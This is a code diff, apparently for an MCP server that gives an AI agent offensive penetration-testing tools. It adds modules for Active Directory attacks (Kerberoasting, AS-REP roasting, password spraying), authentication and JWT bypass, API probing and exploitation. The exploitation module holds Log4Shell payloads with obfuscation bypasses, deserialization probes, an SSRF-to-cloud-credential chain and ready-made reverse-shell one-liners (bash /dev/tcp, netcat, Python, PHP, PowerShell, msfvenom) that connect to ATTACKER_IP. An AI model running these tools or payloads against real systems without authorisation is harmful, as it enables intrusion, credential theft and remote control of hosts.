+                result = await run_command(
+                    ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", check_url],
+                    timeout=8,
+                )
+                if result.get("stdout") and result["stdout"].strip() == "200":
+                    misconfig_results["findings"].append({
+                        "check": check_name, "url": check_url, "status": "exposed",
+                    })
+
+            results["modules"]["misconfig"] = misconfig_results
+
+        # --- SSRF → CREDENTIAL CHAIN ---
+        if "ssrf_chain" in mod_list:
+            chain_results = {"chain_steps": [], "success": False}
+            # This provides the attack chain methodology
+            chain_results["methodology"] = [
+                "1. Find SSRF endpoint (from ssrf_hunter module)",
+                "2. Test metadata endpoint access via SSRF",
+                "3. Extract IAM role name from /iam/security-credentials/",
+                "4. Fetch temporary credentials (AccessKeyId, SecretAccessKey, Token)",
+                "5. Use credentials: aws configure → aws s3 ls → aws iam list-users",
+                "6. Pivot: check for cross-account roles, EC2 instances, Lambda functions",
+            ]
+            chain_results["automated_ssrf_payloads"] = meta_results.get("ssrf_payloads", {}) if "metadata" in results.get("modules", {}) else {}
+            results["modules"]["ssrf_chain"] = chain_results
+
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+
+# ============================================================================
+# MODULE 8: AD ANNIHILATOR
+# ============================================================================
+
+@mcp.tool()
+async def ad_annihilator(
+    target: str, domain: Optional[str] = None, username: Optional[str] = None,
+    password: Optional[str] = None, depth: str = "deep", modules: str = "all",
+    timeout: int = 600,
+) -> str:
+    """AD attack engine: BloodHound, Certipy AD CS, Kerberoast, AS-REP, secretsdump, spray.
+    modules: all|enum,bloodhound,kerberoast,asrep,certipy,spray"""
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("ad_annihilator", target, {"depth": depth, "domain": domain})
+    results = {"target": target, "domain": domain, "modules": {}}
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["enum", "bloodhound", "kerberoast", "asrep", "certipy", "spray"]
+        domain = domain or target
+        if "enum" in mod_list:
+            enum_r = {"users": [], "groups": [], "domain_info": {}}
+            ldap_r = await run_command(["ldapsearch", "-x", "-H", f"ldap://{target}", "-b", "", "-s", "base", "defaultNamingContext"], timeout=30)
+            if ldap_r.get("stdout"):
+                enum_r["domain_info"]["raw"] = ldap_r["stdout"][:2000]
+            rpc_r = await run_command(["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"], timeout=20)
+            if rpc_r.get("stdout"):
+                enum_r["users"] = list(set(re.findall(r"user:\[(\S+?)\]", rpc_r["stdout"])))
+            results["modules"]["enum"] = enum_r
+            if enum_r["users"]:
+                pentest_memory.store_finding(target, "ad_annihilator", "ad_users", {"count": len(enum_r["users"]), "users": enum_r["users"][:50]})
+        if "bloodhound" in mod_list:
+            bh_r = {"status": "pending"}
+            bh_check = await run_command(["which", "bloodhound-python"], timeout=5)
+            if bh_check.get("success"):
+                bh_args = ["bloodhound-python", "-d", domain, "-ns", target, "-c", "All" if depth == "aggressive" else "Default"]
+                if username and password:
+                    bh_args.extend(["-u", username, "-p", password])
+                bh_res = await run_command(bh_args, timeout=min(timeout, 300))
+                bh_r["output"] = bh_res.get("stdout", "")[:3000]
+                bh_r["status"] = "collected" if bh_res.get("success") else "failed"
+            else:
+                bh_r["error"] = "bloodhound-python not installed"
+            results["modules"]["bloodhound"] = bh_r
+        if "kerberoast" in mod_list and username and password:
+            kr = {"hashes_count": 0}
+            gus = await run_command(["impacket-GetUserSPNs", f"{domain}/{username}:{password}", "-dc-ip", target, "-request", "-outputfile", "/tmp/kerberoast.txt"], timeout=60)
+            kr["output"] = gus.get("stdout", "")[:2000]
+            if os.path.exists("/tmp/kerberoast.txt"):
+                with open("/tmp/kerberoast.txt") as f:
+                    kr["hashes_count"] = f.read().count("$krb5tgs$")
+                if kr["hashes_count"] > 0:
+                    kr["crack_cmd"] = "hashcat -m 13100 /tmp/kerberoast.txt wordlist.txt"
+                    pentest_memory.store_finding(target, "ad_annihilator", "kerberoast_hashes", {"count": kr["hashes_count"]})
+            results["modules"]["kerberoast"] = kr
+        if "asrep" in mod_list:
+            ar = {"hashes_count": 0}
+            users = results.get("modules", {}).get("enum", {}).get("users", [])
+            if users:
+                uf = "/tmp/ad_users.txt"
+                with open(uf, "w") as f:
+                    f.write("\n".join(users))
+                gnp = await run_command(["impacket-GetNPUsers", f"{domain}/", "-dc-ip", target, "-usersfile", uf, "-no-pass", "-format", "hashcat", "-outputfile", "/tmp/asrep.txt"], timeout=60)
+                ar["output"] = gnp.get("stdout", "")[:2000]
+                if os.path.exists("/tmp/asrep.txt"):
+                    with open("/tmp/asrep.txt") as f:
+                        ar["hashes_count"] = f.read().count("$krb5asrep$")
+                    if ar["hashes_count"] > 0:
+                        pentest_memory.store_finding(target, "ad_annihilator", "asrep_hashes", {"count": ar["hashes_count"]})
+            results["modules"]["asrep"] = ar
+        if "certipy" in mod_list and username and password:
+            cr = {"vulnerabilities": []}
+            cc = await run_command(["which", "certipy"], timeout=5)
+            if cc.get("success"):
+                certipy_r = await run_command(["certipy", "find", "-u", f"{username}@{domain}", "-p", password, "-dc-ip", target, "-vulnerable", "-stdout"], timeout=60)
+                cr["output"] = certipy_r.get("stdout", "")[:3000]
+                for esc in ["ESC1", "ESC2", "ESC3", "ESC4", "ESC5", "ESC6", "ESC7", "ESC8"]:
+                    if esc in certipy_r.get("stdout", ""):
+                        cr["vulnerabilities"].append(esc)
+                if cr["vulnerabilities"]:
+                    pentest_memory.store_finding(target, "ad_annihilator", "adcs_vulns", {"vulns": cr["vulnerabilities"]})
+            results["modules"]["certipy"] = cr
+        if "spray" in mod_list:
+            sr = {"tested": 0, "found": []}
+            users = results.get("modules", {}).get("enum", {}).get("users", [])
+            pwds = ["Password1", "Welcome1", f"{domain.split('.')[0]}123", "P@ssw0rd", "Changeme1"]
+            for pwd in pwds[:3]:
+                for user in users[:20]:
+                    sr["tested"] += 1
+                    sc = await run_command(["smbclient", f"//{target}/IPC$", "-U", f"{domain}/{user}%{pwd}", "-c", "exit"], timeout=10)
+                    if sc.get("success"):
+                        sr["found"].append({"user": user, "password": pwd})
+                        pentest_memory.store_finding(target, "ad_annihilator", "credentials", {"user": user, "source": "spray"})
+                await asyncio.sleep(2)
+            results["modules"]["spray"] = sr
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 9: API BREAKER
+# ============================================================================
+
+@mcp.tool()
+async def api_breaker(
+    target: str, depth: str = "deep", modules: str = "all",
+    api_type: str = "auto", timeout: int = 600,
+) -> str:
+    """API exploitation: REST discovery, GraphQL introspection+batch+depth, Spring Actuator, 405 bypass, auth test.
+    modules: all|discover,graphql,actuator,method_enum,auth_test"""
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("api_breaker", target, {"depth": depth, "api_type": api_type})
+    results = {"target": target, "modules": {}}
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["discover", "graphql", "actuator", "method_enum", "auth_test"]
+        delay = rate_limit_detector.get_delay(target)
+        if "discover" in mod_list:
+            dr = {"endpoints": [], "openapi": None}
+            for path in ["/swagger.json", "/v2/api-docs", "/v3/api-docs", "/openapi.json", "/api-docs", "/docs", "/api/swagger.json"]:
+                r = await run_command(["curl", "-sk", "-w", "\n%{http_code}", f"{target}{path}"], timeout=8)
+                if r.get("stdout"):
+                    lines = r["stdout"].strip().split("\n")
+                    status = lines[-1].strip()
+                    body = "\n".join(lines[:-1])
+                    if status == "200" and len(body) > 50:
+                        dr["endpoints"].append({"path": path, "status": 200, "size": len(body)})
+                        try:
+                            spec = json.loads(body)
+                            if "paths" in spec:
+                                dr["openapi"] = {"title": spec.get("info", {}).get("title", ""), "paths": list(spec["paths"].keys())[:50], "total": len(spec["paths"])}
+                                pentest_memory.store_finding(target, "api_breaker", "api_spec", {"paths": len(spec["paths"])})
+                        except (json.JSONDecodeError, KeyError):
+                            pass
+                await asyncio.sleep(delay * 0.3)
+            results["modules"]["discover"] = dr
+        if "graphql" in mod_list:
+            gr = {"endpoint_found": False, "introspection": None, "vulns": []}
+            for gp in ["/graphql", "/api/graphql", "/v1/graphql", "/gql"]:
+                iq = json.dumps({"query": "{ __schema { types { name kind fields { name type { name } } } } }"})
+                r = await run_command(["curl", "-sk", "-X", "POST", f"{target}{gp}", "-H", "Content-Type: application/json", "-d", iq], timeout=15)
+                if r.get("stdout") and "__schema" in r["stdout"]:
+                    gr["endpoint_found"] = True
+                    gr["endpoint"] = f"{target}{gp}"
+                    try:
+                        schema = json.loads(r["stdout"])
+                        types_d = schema.get("data", {}).get("__schema", {}).get("types", [])
+                        gr["introspection"] = {"types_count": len(types_d), "types": [{"name": t["name"], "kind": t["kind"]} for t in types_d if not t["name"].startswith("__")][:30]}
+                    except json.JSONDecodeError:
+                        pass
+                    if depth in ["deep", "aggressive"]:
+                        bq = json.dumps([{"query": "{ __typename }"}, {"query": "{ __typename }"}])
+                        br = await run_command(["curl", "-sk", "-X", "POST", f"{target}{gp}", "-H", "Content-Type: application/json", "-d", bq], timeout=10)
+                        if br.get("stdout"):
+                            try:
+                                if isinstance(json.loads(br["stdout"]), list):
+                                    gr["vulns"].append({"type": "batch_queries_enabled", "severity": "medium"})
+                            except json.JSONDecodeError:
+                                pass
+                    pentest_memory.store_finding(target, "api_breaker", "graphql_found", {"endpoint": f"{target}{gp}"})
+                    break
+            results["modules"]["graphql"] = gr
+        if "actuator" in mod_list:
+            ar = {"endpoints": {}, "secrets": []}
+            for path in ["/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings", "/actuator/configprops", "/actuator/heapdump", "/actuator/beans", "/manage/env", "/jolokia"]:
+                r = await run_command(["curl", "-sk", "-w", "\n%{http_code}", f"{target}{path}"], timeout=8)
+                if r.get("stdout"):
+                    lines = r["stdout"].strip().split("\n")
+                    status = lines[-1].strip()
+                    body = "\n".join(lines[:-1])
+                    if status == "200":
+                        ar["endpoints"][path] = {"accessible": True, "size": len(body), "preview": body[:500]}
+                        if "/env" in path:
+                            secs = re.findall(r'"(\w*(?:password|secret|key|token)\w*)":\s*"([^"]*)"', body, re.IGNORECASE)
+                            for n, v in secs:
+                                if v and v != "******":
+                                    ar["secrets"].append({"name": n, "value": v[:50]})
+                await asyncio.sleep(delay * 0.3)
+            if ar["endpoints"]:
+                pentest_memory.store_finding(target, "api_breaker", "actuator_exposed", {"endpoints": list(ar["endpoints"].keys()), "secrets": len(ar["secrets"])})
+            results["modules"]["actuator"] = ar
+        if "method_enum" in mod_list:
+            mr = {"endpoints": {}}
+            methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]
+            for path in ["/", "/api", "/api/v1", "/admin"][:4]:
+                pr = {}
+                for m in methods:
+                    r = await run_command(["curl", "-sk", "-X", m, "-o", "/dev/null", "-w", "%{http_code}", f"{target}{path}", "-H", "Content-Type: application/json"], timeout=8)
+                    if r.get("stdout"):
+                        s = r["stdout"].strip()
+                        if s.isdigit() and s != "0":
+                            pr[m] = int(s)
+                            orchestrator.analyze_response_code(target, path, int(s))
+                    await asyncio.sleep(delay * 0.2)
+                if pr:
+                    mr["endpoints"][path] = pr
+            results["modules"]["method_enum"] = mr
+        if "auth_test" in mod_list:
+            atr = {"bypasses": []}
+            headers_bypass = [("X-Forwarded-For", "127.0.0.1"), ("X-Original-URL", "/admin"), ("X-Custom-IP-Authorization", "127.0.0.1"), ("Authorization", "Basic YWRtaW46YWRtaW4=")]
+            for path in ["/admin", "/api/admin", "/internal"]:
+                base = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", f"{target}{path}"], timeout=8)
+                bs = base.get("stdout", "").strip()
+                if bs in ["401", "403"]:
+                    for hn, hv in headers_bypass:
+                        br = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", "-H", f"{hn}: {hv}", f"{target}{path}"], timeout=8)
+                        brs = br.get("stdout", "").strip()
+                        if brs and brs != bs and brs in ["200", "301", "302"]:
+                            atr["bypasses"].append({"path": path, "header": f"{hn}: {hv}", "original": int(bs), "bypass": int(brs)})
+                    break
+            results["modules"]["auth_test"] = atr
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 10: VULN SCANNER ULTRA
+# ============================================================================
+
+@mcp.tool()
+async def vuln_scanner_ultra(
+    target: str, depth: str = "deep", modules: str = "all",
+    severity: str = "medium,high,critical", timeout: int = 600,
+) -> str:
+    """Unified vuln scanner: Nuclei (auto-template), CVE mapping, nmap vuln scripts.
+    modules: all|nuclei,cve_map,nmap_vuln,custom"""
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("vuln_scanner_ultra", target, {"depth": depth})
+    results = {"target": target, "modules": {}}
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["nuclei", "cve_map", "nmap_vuln", "custom"]
+        if "nuclei" in mod_list:
+            nr = {"findings": []}
+            na = ["nuclei", "-u", target, "-jsonl", "-silent", "-severity", severity]
+            stack = orchestrator.adapt_to_stack(target)
+            tags_map = {"spring": "java,spring", "django": "python,django", "express": "nodejs", "php": "php,wordpress", "aspnet": "dotnet,iis", "go": "go"}
+            if stack["adapted"] and stack["stack"] in tags_map:
+                na.extend(["-tags", tags_map[stack["stack"]]])
+            rate = {"stealth": "10", "light": "50", "deep": "150", "aggressive": "300"}.get(depth, "150")
+            na.extend(["-rl", rate])
+            nres = await run_command(na, timeout=timeout)
+            if nres.get("stdout"):
+                for line in nres["stdout"].strip().split("\n"):
+                    if line.strip():
+                        try:
+                            f = json.loads(line)
+                            nr["findings"].append({"template": f.get("template-id", ""), "name": f.get("info", {}).get("name", ""), "severity": f.get("info", {}).get("severity", ""), "matched": f.get("matched-at", "")})
+                        except json.JSONDecodeError:
+                            nr["findings"].append({"raw": line[:200]})
+            results["modules"]["nuclei"] = nr
+            if nr["findings"]:
+                pentest_memory.store_finding(target, "vuln_scanner_ultra", "nuclei_vulns", {"count": len(nr["findings"])})
+                # Register each nuclei finding with VulnCorrelator + CVSS
+                for nf in nr["findings"]:
+                    nf_sev = nf.get("severity", "info").lower()
+                    cvss_map = {"critical": 9.5, "high": 7.5, "medium": 5.0, "low": 2.5, "info": 0.5}
+                    nf_score = cvss_map.get(nf_sev, 3.0)
+                    vuln_correlator.add_vulnerability(VulnFinding(
+                        vuln_id=nf.get("template", "nuclei_unknown"),
+                        title=nf.get("name", nf.get("template", "Nuclei finding")),
+                        severity=nf_sev, cvss_score=nf_score, cvss_vector="",
+                        target=target, service="http",
+                        evidence=nf.get("matched", "")[:200],
+                        exploitable=nf_sev in ["critical", "high"],
+                        kill_chain_phase="exploitation" if nf_sev in ["critical", "high"] else "reconnaissance",
+                        mitre_techniques=["T1190"] if nf_sev in ["critical", "high"] else ["T1595"],
+                    ))
+        if "cve_map" in mod_list:
+            cm = {"services_with_cves": []}
+            pf = pentest_memory.get_findings(target, "open_ports")
+            if pf:
+                for svc in pf[-1].get("data", {}).get("services", []):
+                    if svc.get("product") and svc.get("version"):
+                        nv = await run_command(["nmap", "--script", "vulners", "-sV", "-p", str(svc["port"]), target, "-oX", "-"], timeout=60)
+                        if nv.get("stdout"):
+                            cves = list(set(re.findall(r"(CVE-\d{4}-\d+)", nv["stdout"])))
+                            if cves:
+                                cm["services_with_cves"].append({"port": svc["port"], "product": svc["product"], "version": svc["version"], "cves": cves[:10]})
+            results["modules"]["cve_map"] = cm
+        if "nmap_vuln" in mod_list:
+            nvr = {"vulnerabilities": []}
+            scripts = "vuln,exploit,auth" if depth == "aggressive" else "vuln"
+            nv = await run_command(["nmap", "--script", scripts, "-sV", target, "-oX", "-"], timeout=min(timeout, 300))
+            if nv.get("stdout"):
+                try:
+                    root = ET.fromstring(nv["stdout"])
+                    for s in root.findall(".//script"):
+                        out = s.get("output", "")
+                        if "VULNERABLE" in out.upper():
+                            nvr["vulnerabilities"].append({"script": s.get("id", ""), "output": out[:500]})
+                except ET.ParseError:
+                    pass
+            results["modules"]["nmap_vuln"] = nvr
+        if "custom" in mod_list:
+            cr = {"checks": []}
+            for payload in ["${jndi:ldap://127.0.0.1/t}", "${${lower:j}ndi:${lower:l}dap://127.0.0.1/t}"]:
+                for hdr in ["User-Agent", "X-Forwarded-For", "X-Api-Version"]:
+                    r = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", "-H", f"{hdr}: {payload}", target], timeout=8)
+                    if r.get("stdout", "").strip() not in ["000", ""]:
+                        cr["checks"].append({"type": "log4shell_probe", "header": hdr, "status": r["stdout"].strip()})
+                        break
+                break
+            results["modules"]["custom"] = cr
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 11: EXPLOIT ENGINE
+# ============================================================================
+
+@mcp.tool()
+async def exploit_engine(
+    target: str, exploit_type: str = "auto", depth: str = "deep", modules: str = "all",
+    lhost: Optional[str] = None, lport: int = 4444, timeout: int = 600,
+) -> str:
+    """Exploitation: Metasploit, deserialization, Log4Shell (10+ bypass), reverse shells, chains.
+    modules: all|metasploit,deser,log4shell,revshell,chain"""
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("exploit_engine", target, {"exploit_type": exploit_type})
+    results = {"target": target, "modules": {}}
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["metasploit", "deser", "log4shell", "revshell", "chain"]
+        if "metasploit" in mod_list:
+            mr = {"exploits_suggested": []}
+            tech = pentest_memory.get_tech(target)
+            fw = tech.get("framework", "").lower()
+            if "spring" in fw:
+                mr["exploits_suggested"] = ["exploit/multi/http/spring4shell", "exploit/multi/http/log4shell_header_injection", "exploit/multi/http/tomcat_mgr_upload"]
+            elif "php" in fw:
+                mr["exploits_suggested"] = ["exploit/unix/webapp/wp_admin_shell_upload", "exploit/multi/http/php_cgi_arg_injection"]
+            elif "aspnet" in fw:
+                mr["exploits_suggested"] = ["exploit/windows/http/iis_webdav_upload_asp"]
+            results["modules"]["metasploit"] = mr
+        if "deser" in mod_list:
+            dr = {"tests": []}
+            for lang, ct, payload in [("java", "application/x-java-serialized-object", "rO0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbs..."), ("php", "application/x-httpd-php", 'O:4:"Test":0:{}'), ("node", "application/json", '{"rce":"_$$ND_FUNC$$_function(){return 1}()"}')]:
+                r = await run_command(["curl", "-sk", "-X", "POST", target, "-H", f"Content-Type: {ct}", "-d", payload, "-w", "\n%{http_code}"], timeout=10)
+                if r.get("stdout"):
+                    lines = r["stdout"].strip().split("\n")
+                    s = lines[-1].strip()
+                    dr["tests"].append({"language": lang, "status": int(s) if s.isdigit() else 0, "interesting": s in ["200", "500"]})
+            dr["gadget_chains"] = ["CommonsCollections1-7", "Spring1-2", "Groovy1", "JRMPClient", "URLDNS"]
+            results["modules"]["deser"] = dr
+        if "log4shell" in mod_list:
+            lr = {"payloads_tested": 0, "bypass_techniques": []}
+            cb = lhost or "127.0.0.1"
+            payloads = [
+                "${jndi:ldap://CB/t}", "${${lower:j}ndi:${lower:l}dap://CB/t}",
+                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://CB/t}",
+                "${${env:X:-j}ndi${env:X:-:}${env:X:-l}dap${env:X:-:}//CB/t}",
+                "${j${::-n}d${::-i}:l${::-d}a${::-p}://CB/t}",
+                "${jndi:dns://CB/t}", "${jndi:rmi://CB/t}",
+                "${${upper:j}${upper:n}${upper:d}${upper:i}:${upper:l}dap://CB/t}",
+            ]
+            hdrs = ["User-Agent", "X-Forwarded-For", "Referer", "X-Api-Version", "Authorization", "Cookie"]
+            for pt in payloads:
+                p = pt.replace("CB", f"{cb}:{lport}")
+                for h in hdrs[:4]:
+                    await run_command(["curl", "-sk", "--max-time", "5", target, "-H", f"{h}: {p}"], timeout=8)
+                    lr["payloads_tested"] += 1
+                await asyncio.sleep(rate_limit_detector.get_delay(target))
+            lr["bypass_techniques"] = ["lowercase", "obfuscation", "env_var", "upper", "dns_callback", "rmi", "double_payload", "url_encoding"]
+            lr["verify"] = f"Listener: python3 -m http.server {lport} | interactsh-client"
+            results["modules"]["log4shell"] = lr
+        if "revshell" in mod_list:
+            h = lhost or "ATTACKER_IP"
+            p = lport
+            results["modules"]["revshell"] = {"shells": {
+                "bash": f"bash -i >& /dev/tcp/{h}/{p} 0>&1",
+                "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{h}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
+                "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {h} {p} >/tmp/f",
+                "php": f"php -r '$s=fsockopen(\"{h}\",{p});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
+                "powershell": f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{h}',{p});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS > ');$s.Write($sb,0,$sb.Length)}}\"",
+                "listener": f"nc -lvnp {p}",
+                "msfvenom_lin": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={h} LPORT={p} -f elf -o shell",
+                "msfvenom_win": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={h} LPORT={p} -f exe -o shell.exe",
+            }}
+        if "chain" in mod_list:
+            cr = {"chains": []}
+            ctx = pentest_memory.get_context(target)
+            ft = ctx.get("finding_types", [])
+            if "ssrf_found" in ft or "ssrf_potential" in ft:
+                cr["chains"].append({"name": "SSRF->Cloud Creds", "steps": ["Exploit SSRF", "Access metadata 169.254.169.254", "Extract IAM creds", "Pivot with AWS CLI"], "severity": "critical"})
+            if "sqli_found" in ft:
+                cr["chains"].append({"name": "SQLi->RCE", "steps": ["sqlmap --os-shell", "Write webshell", "Reverse shell"], "severity": "critical"})
+            if "actuator_exposed" in ft:
+                cr["chains"].append({"name": "Actuator->RCE", "steps": ["Dump /env secrets", "Download heapdump", "Extract creds", "Jolokia RCE"], "severity": "critical"})
+            results["modules"]["chain"] = cr
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 12: AUTH DESTROYER
+# ============================================================================
+
+@mcp.tool()
+async def auth_destroyer(
+    target: str, depth: str = "deep", modules: str = "all",
+    jwt_token: Optional[str] = None, timeout: int = 600,
+) -> str:
+    """Auth/authz bypass: JWT attacks (none/confusion/brute), IDOR, CORS, default creds, header bypass, path mutation.
+    modules: all|jwt,idor,cors,default_creds,header_bypass,path_mutation"""
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("auth_destroyer", target, {"depth": depth})
+    results = {"target": target, "modules": {}}
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["jwt", "idor", "cors", "default_creds", "header_bypass", "path_mutation"]
+        delay = rate_limit_detector.get_delay(target)
+        if "jwt" in mod_list and jwt_token:
+            jr = {"decoded": {}, "attacks": []}
             try:
-                socket.gethostbyname(subdomain)
-                dns_subs.add(subdomain)
+                parts = jwt_token.split(".")
+                if len(parts) == 3:
+                    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
+                    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
+                    jr["decoded"] = {"header": header, "payload": payload}
+                    none_h = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
+                    none_tok = f"{none_h}.{parts[1]}."
+                    nr = await run_command(["curl", "-sk", "-H", f"Authorization: Bearer {none_tok}", target, "-w", "\n%{http_code}"], timeout=10)
+                    if nr.get("stdout") and nr["stdout"].strip().split("\n")[-1] in ["200", "201"]:
+                        jr["attacks"].append({"type": "none_algorithm", "severity": "critical", "success": True})
+                    if header.get("alg", "").startswith("RS"):
+                        jr["attacks"].append({"type": "alg_confusion_possible", "severity": "high"})
+                    for rf in ["role", "admin", "is_admin", "permissions"]:
+                        if rf in payload:
+                            jr["attacks"].append({"type": "role_manipulation", "field": rf, "original": payload[rf]})
+            except Exception as je:
+                jr["error"] = str(je)
+            results["modules"]["jwt"] = jr
+        if "idor" in mod_list:
+            ir = {"vulnerabilities": []}
+            base = await run_command(["curl", "-sk", f"{target}{'&' if '?' in target else '?'}id=1"], timeout=10)
+            bs = len(base.get("stdout", ""))
+            for tid in [0, 2, 3, 100, 999]:
+                r = await run_command(["curl", "-sk", f"{target}{'&' if '?' in target else '?'}id={tid}"], timeout=10)
+                rs = len(r.get("stdout", ""))
+                if rs > 100 and rs != bs:
+                    ir["vulnerabilities"].append({"id": tid, "size": rs, "baseline": bs})
+                await asyncio.sleep(delay)
+            results["modules"]["idor"] = ir
+        if "cors" in mod_list:
+            cr = {"tests": [], "misconfigured": False}
+            for origin in ["https://evil.com", "https://attacker.com", "null"]:
+                r = await run_command(["curl", "-sk", "-I", "-H", f"Origin: {origin}", target], timeout=10)
+                if r.get("stdout"):
+                    acao = ""
+                    for line in r["stdout"].split("\n"):
+                        if "access-control-allow-origin" in line.lower():
+                            acao = line.split(":", 1)[1].strip() if ":" in line else ""
+                    if acao and (origin in acao or acao == "*"):
+                        cr["tests"].append({"origin": origin, "acao": acao, "vulnerable": True})
+                        cr["misconfigured"] = True
+            results["modules"]["cors"] = cr
+        if "default_creds" in mod_list:
+            dcr = {"found": []}
+            creds = [("admin", "admin"), ("admin", "password"), ("admin", "123456"), ("root", "root"), ("test", "test")]
+            for path in ["/login", "/admin/login", "/api/login", "/api/auth/login"]:
+                chk = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", f"{target}{path}"], timeout=8)
+                if chk.get("stdout", "").strip() in ["200", "401", "302"]:
+                    for u, p in creds:
+                        lr = await run_command(["curl", "-sk", "-X", "POST", f"{target}{path}", "-H", "Content-Type: application/json", "-d", json.dumps({"username": u, "password": p}), "-w", "\n%{http_code}"], timeout=8)
+                        if lr.get("stdout"):
+                            lines = lr["stdout"].strip().split("\n")
+                            s = lines[-1]
+                            body = "\n".join(lines[:-1])
+                            if s in ["200", "302"] and any(t in body.lower() for t in ["token", "success", "welcome"]):
+                                dcr["found"].append({"path": path, "user": u, "pass": p})
+                                pentest_memory.store_finding(target, "auth_destroyer", "default_creds", {"user": u})
+                        await asyncio.sleep(delay)
+                    break
+            results["modules"]["default_creds"] = dcr
+        if "header_bypass" in mod_list:
+            hbr = {"bypasses": []}
+            for path in ["/admin", "/internal", "/dashboard"]:
+                base = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", f"{target}{path}"], timeout=8)
+                bs = base.get("stdout", "").strip()
+                if bs in ["403", "401"]:
+                    for hn, hv in [("X-Forwarded-For", "127.0.0.1"), ("X-Original-URL", path), ("X-Real-IP", "127.0.0.1"), ("X-Custom-IP-Authorization", "127.0.0.1")]:
+                        br = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", "-H", f"{hn}: {hv}", f"{target}{path}"], timeout=8)
+                        brs = br.get("stdout", "").strip()
+                        if brs and brs != bs and brs in ["200", "301", "302"]:
+                            hbr["bypasses"].append({"path": path, "header": f"{hn}: {hv}", "original": int(bs), "bypass": int(brs)})
+                    break
+            results["modules"]["header_bypass"] = hbr
+        if "path_mutation" in mod_list:
+            pmr = {"bypasses": []}
+            for m in ["/admin", "/Admin", "/ADMIN", "/admin/", "/%2fadmin", "/admin..;/", "/;/admin", "/.;/admin", "/admin.json"]:
+                r = await run_command(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}|%{size_download}", f"{target}{m}"], timeout=8)
+                if r.get("stdout"):
+                    parts = r["stdout"].strip().split("|")
+                    s = int(parts[0]) if parts[0].isdigit() else 0
+                    sz = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
+                    if s == 200 and sz > 100:
+                        pmr["bypasses"].append({"path": m, "status": s, "size": sz})
+                await asyncio.sleep(delay * 0.3)
+            results["modules"]["path_mutation"] = pmr
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 13: SSRF HUNTER
+# ============================================================================
+
+@mcp.tool()
+async def ssrf_hunter(
+    target: str, param: Optional[str] = None, depth: str = "deep",
+    callback_host: Optional[str] = None, timeout: int = 600,
+) -> str:
+    """SSRF specialist: URL-based, blind OOB, DNS rebinding, cloud metadata chain, filter bypass, protocol smuggling."""
